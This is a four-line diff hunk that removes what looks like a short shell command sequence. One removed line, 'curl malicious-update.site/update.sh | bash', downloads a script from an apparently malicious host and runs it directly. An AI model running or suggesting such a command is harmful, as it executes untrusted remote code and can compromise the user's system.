@@ -1,4 +1,0 @@
-ls
-cd /tmp
-curl malicious-update.site/update.sh | bash
-history
